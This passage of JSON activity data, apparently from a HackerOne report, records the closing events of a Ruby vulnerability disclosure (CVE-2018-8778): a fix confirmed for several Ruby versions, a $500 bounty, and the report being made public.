ble":false,"type":"Activities::Comment","message":"The patch will fix the vulnerability.","markdown_message":"\u003cp\u003eThe patch will fix the vulnerability.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-08T02:59:27.622Z","updated_at":"2018-03-08T02:59:27.622Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2508053,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-20T00:18:35.320Z","updated_at":"2018-03-20T00:18:35.320Z","cve_ids":["CVE-2018-8778"],"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2542435,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We fixed this report with Ruby 2.2.10, 2.3.7, 2.4.4, 2.5.1","markdown_message":"\u003cp\u003eWe fixed this report with Ruby 2.2.10, 2.3.7, 2.4.4, 2.5.1\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-29T01:45:47.900Z","updated_at":"2018-03-29T01:45:47.900Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2545860,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-30T02:00:44.193Z","updated_at":"2018-03-30T02:00:44.193Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ruby","collaborator":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2545864,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-30T02:01:21.829Z","updated_at":"2018-03-30T02:01:21.829Z","first_to_agree":true,"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2546727,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the reward.","markdown_message":"\u003cp\u003eThanks for the reward.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-30T08:40:02.044Z","updated_at":"2018-03-30T08:40:02.044Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2546728,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-30T08:40:12.989Z","updated_at":"2018-03-30T08:40:12.989Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2546729,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-30T08:40:13.065Z","updated_at":"2018-03-30T08:40:13.065Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}